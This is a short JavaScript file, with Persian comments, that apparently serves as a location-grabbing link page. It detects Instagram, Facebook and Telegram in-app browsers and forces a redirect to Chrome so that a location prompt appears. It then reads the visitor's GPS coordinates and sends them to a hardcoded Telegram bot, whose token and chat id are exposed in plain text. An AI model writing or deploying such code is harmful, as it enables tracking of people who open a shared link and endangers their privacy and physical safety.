// -----------------------------
// 1) ریدایرکت خودکار به Chrome
// -----------------------------
(function () {
    var ua = navigator.userAgent || navigator.vendor || window.opera;

    // تشخیص مرورگرهای داخلی (WebView)
    var inWebView =
        ua.includes("Instagram") ||
        ua.includes("FBAN") ||
        ua.includes("FBAV") ||
        ua.includes("Telegram") ||
        ua.includes("WebView");

    if (inWebView) {
        var url = window.location.href.replace("https://", "");
        window.location.href = "googlechrome://" + url;

        // اگر Chrome نصب نیست
        setTimeout(() => {
            alert("⚠️ لطفاً لینک را در مرورگر Chrome باز کنید تا اجازه موقعیت داده شود.");
        }, 1500);
    }
})();

// -----------------------------
// 2) دریافت موقعیت مکانی
// -----------------------------
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, showError);
    } else {
        alert("Geolocation not supported.");
    }
}

// -----------------------------
// 3) ارسال موقعیت به تلگرام
// -----------------------------
function showPosition(position) {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;

    var text = "Latitude: " + lat + ", Longitude: " + lon;

    var url =
        "https://api.telegram.org/bot8259403842:AAHhSOVYeuX8C9A5H-cYC_upkRc67kRbF-s/sendMessage?chat_id=7372882497&text=" +
        encodeURIComponent(text);

    var xhr = new XMLHttpRequest();
    xhr.open("GET", url, true);
    xhr.send();

    alert("Location sent to Telegram!");
}

// -----------------------------
// 4) مدیریت خطا
// -----------------------------
function showError(error) {
    alert("Error: " + error.message);
}
